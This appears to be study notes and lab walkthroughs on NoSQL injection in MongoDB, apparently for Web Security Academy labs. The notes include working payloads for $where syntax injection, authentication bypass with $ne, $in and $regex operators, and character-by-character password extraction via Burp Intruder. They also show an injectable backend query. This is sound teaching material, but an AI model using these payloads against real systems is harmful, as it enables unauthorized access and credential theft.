 There are two different types of NoSQL injection:
 - Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
 - Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

### Lab: Detecting NoSQL injection
There's a vulnerable to nosqli endpoint:
```bash
GET /filter?category=Accessories HTTP/1.1
```
So we try:
```bash
GET /filter?category=Accessories' 
```
And we get back the err:
```
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
```
On the backend they have something like:
```bash
const result = await productMongooseModel.find({ $where: `this.category === '${req.query.category}'`})
```
That `$where` from official mongodb docs:
```
Use the $where operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system
```
To solve the lab, we need to perform a NoSQL injection attack that causes the application to display unreleased products. 

Therefore we check if we can inject boolean conditions to change the response
(don't forget to url encode, here is just shown in this way for the sake of readability)
```
GET /filter?category=Gifts' && 0 && 'x
```
Before the injection GET /filter?category=Gifts retrived 3 products but with the condition `&& 0` mongo returns `false` for every item in the collection and as a result we see no products in the response.

Later if we change to:
```
GET /filter?category=Gifts' && 1 && 'x
```
We see our 3 products again

So to see all products let's modify to the following (don't forget to url-encode):
```
GET /filter?category=Gifts' || 1 || 'x
```
And we see more than 3 products (we see all of them)


## NoSQL operator injection
## Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`. 

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following: 
1. Convert the request method from `GET` to `POST`.
1. Change the `Content-Type` header to `application/json`.
1. Add JSON to the message body.
1. Inject query operators in the JSON.

## Detecting operator injection in MongoDB
 Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
```
{"username":"wiener","password":"peter"}
```
Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection: 
```
{"username":{"$ne":"invalid"},"password":{"peter"}}
```
 If the `$ne` operator is applied, this queries all users where the username is not equal to invalid.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload: 
```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection. 

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example: 
```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```
### Lab: Exploiting NoSQL operator injection to bypass authentication
Endpoint:
```bash
POST /login HTTP/1.1

{"username":"wiener","password":"peter"}
```
Change to:
```bash
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

## Exploiting syntax injection to extract data 
In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's $where operator and mapReduce() function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
```
https://insecure-website.com/user/lookup?username=admin
```

This results in the following NoSQL query of the users collection:
```
{"$where":"this.username == 'admin'"}
```

As the query uses the $where operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
```
admin' && this.password[0] == 'a' || 'a'=='b
```

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript match() function to extract information. For example, the following payload enables you to identify whether the password contains digits:
```
admin' && this.password.match(/\d/) || 'a'=='b
```

### Lab: Exploiting NoSQL injection to extract data
There's an endpoint:
```
GET /user/lookup?user=wiener HTTP/2
```
Making sure it is vulnerable (not url encoded for the sake of readability):
```
GET /user/lookup?user=wiener' && '1' == '1
```
Find out the password length
```
GET /user/lookup?user=administrator' && this.password.length < 30 || 'a'=='b
```

Right-click the request and select Send to Intruder.
In Intruder, enumerate the password:
- Change the user parameter to `administrator' && this.password[§0§]=='§a§`. This includes two payload positions. Make sure to URL-encode the payload.
- Select Cluster bomb attack from the attack type drop-down menu.
- In the Payloads side panel, select position 1 from the Payload position drop-down list. Add numbers from 0 to 7 for each character of the password.
- Select position 2 from the Payload position drop-down list, then add lowercase letters from a to z. If you're using Burp Suite Professional, you can use the built-in a-z list.
- Click Start attack.
- Sort the attack results by Payload 1, then Length. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the administrator user. Note the letters from the Payload 2 column down.

In Burp's browser, log in as the administrator user using the enumerated password. The lab is solved.

